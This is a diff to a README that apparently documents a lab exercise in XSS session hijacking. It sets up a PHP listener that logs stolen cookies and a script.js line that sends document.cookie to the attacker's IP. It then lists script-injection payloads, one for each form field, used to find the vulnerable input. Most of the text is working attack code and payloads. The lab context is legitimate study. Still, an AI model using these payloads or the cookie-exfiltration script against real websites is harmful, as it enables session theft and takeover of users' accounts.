@@ -13,7 +13,7 @@ This repository documents identifying a vulnerable input field via XSS and perfo
 mkdir /tmp/tmpserver
 cd /tmp/tmpserver
 ```
-## index.php 
+**index.php** 
 ```bash
 <?php
 if (isset($_GET['c'])) {
@@ -27,16 +27,31 @@ if (isset($_GET['c'])) {
 }
 ?>
 ```
-## script.js
+**script.js**
 ```bash
 new Image().src='http://10.10.14.179/index.php?c='+document.cookie;
 ```
-## cookies.txt
+**cookies.txt**
 ```bash
 sudo touch cookies.txt
 sudo chmod 666 cookies.txt
 ```
-## Run server
+**Run server**
 ```bash
 sudo php -S 0.0.0.0:80
 ```
+### 2. Identify Vulnerable Field
+**Form**: http://10.129.31.89/hijacking/index.php
+
+**Fields Tested:**
+fullname: "><script src=http://10.10.14.179/fullname></script>
+username: "><script src=http://10.10.14.179/username></script>
+password: "><script src=http://10.10.14.179/password></script>
+email: "><script src=http://10.10.14.179/email></script>
+imgurl: "><script src=http://10.10.14.179/imgurl></script>
+
+**Process:**
+Injected each payload into one field at a time, others set to **test**.
+Checked server logs for requests (e.g., GET /fullname).
+Vulnerable field identified when a request appeared.
+
